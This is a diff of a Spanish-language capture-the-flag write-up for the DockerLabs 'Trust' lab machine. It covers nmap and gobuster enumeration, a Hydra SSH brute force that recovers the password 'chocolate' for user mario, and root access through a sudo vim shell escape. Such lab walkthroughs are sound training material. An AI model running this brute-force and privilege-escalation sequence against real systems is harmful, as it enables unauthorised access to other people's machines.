@@ -1,48 +1,120 @@
-
 # DockerLabs - Trust
 
-## 1. Escaneo con Nmap
+> Máquina enfocada en enumeración web, fuerza bruta SSH y escalada de privilegios mediante permisos sudo sobre `vim`.
+
+---
+
+# Reconocimiento
+
+## Escaneo con Nmap
+
+Primero realizo un escaneo general para identificar los puertos abiertos en la máquina víctima.
 
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2
-![[nmap2.png]]
-Puertos: 22 (SSH) y 80 (HTTP)
+
+![Nmap](nmap2.png)
+
+### Puertos encontrados
+
+| Puerto | Servicio |
+| ------ | -------- |
+| 22     | SSH      |
+| 80     | HTTP     |
 
 ---
 
-## 2. Enumeración Web
+# Enumeración Web
+
+## Fuzzing con Gobuster
+
+Realizo fuzzing web para descubrir archivos y directorios ocultos.
 
 gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-![[Gobuster2.png]]
-Hallazgo: secret.php
+
+![Gobuster](Gobuster2.png)
+
+### Hallazgo
+
+* secret.php
+
+---
+
+## Análisis de secret.php
 
 curl http://172.18.0.2/secret.php
-![[Curl2.png]]
-Mensaje: "Hola Mario" -> Usuario: mario
+
+![Curl](Curl2.png)
+
+### Información obtenida
+
+Mensaje encontrado:
+
+Hola Mario
+
+Usuario identificado:
+
+* mario
 
 ---
 
-## 3. Fuerza Bruta SSH
+# Fuerza Bruta SSH
+
+Con el usuario identificado realizo un ataque de fuerza bruta utilizando Hydra.
 
 hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
-![[Hydra2.png]]
-Credencial: mario:chocolate
+
+![Hydra](Hydra2.png)
+
+### Credenciales encontradas
+
+| Usuario | Contraseña |
+| ------- | ---------- |
+| mario   | chocolate  |
 
 ---
 
-## 4. Acceso SSH
+# Acceso SSH
+
+Utilizo las credenciales encontradas para conectarme al sistema.
 
 ssh mario@172.18.0.2
-![[SSH2.png]]
+
+![SSH](SSH2.png)
 
 ---
 
-## 5. Escalada de Privilegios
+# Escalada de Privilegios
+
+## Enumeración sudo
+
+Verifico los permisos sudo del usuario.
 
 sudo -l
-![[Sudo2.png]]
-Resultado: mario puede ejecutar /usr/bin/vim como root
+
+![Sudo](Sudo2.png)
+
+### Resultado
+
+El usuario `mario` puede ejecutar:
+
+/usr/bin/vim
+
+como root.
+
+---
+
+## Obtención de root
 
 sudo vim -c ':!/bin/bash'
-![[Sudo2.png]]
+
+![Root](Root2.png)
+
+Verificación de privilegios:
+
 whoami
+
 root
+
+---
+
+# Máquina comprometida exitosamente
